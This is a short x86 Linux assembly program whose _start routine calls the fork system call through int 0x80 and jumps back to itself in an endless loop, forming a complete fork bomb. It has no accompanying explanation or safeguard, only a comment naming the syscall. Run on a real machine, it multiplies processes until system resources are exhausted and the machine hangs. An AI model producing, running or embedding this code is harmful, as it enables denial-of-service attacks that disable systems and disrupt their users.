section .text

global _start
 _start:
mov eax,2 ;System call for forking
int 0x80 ;Call kernel
jmp _start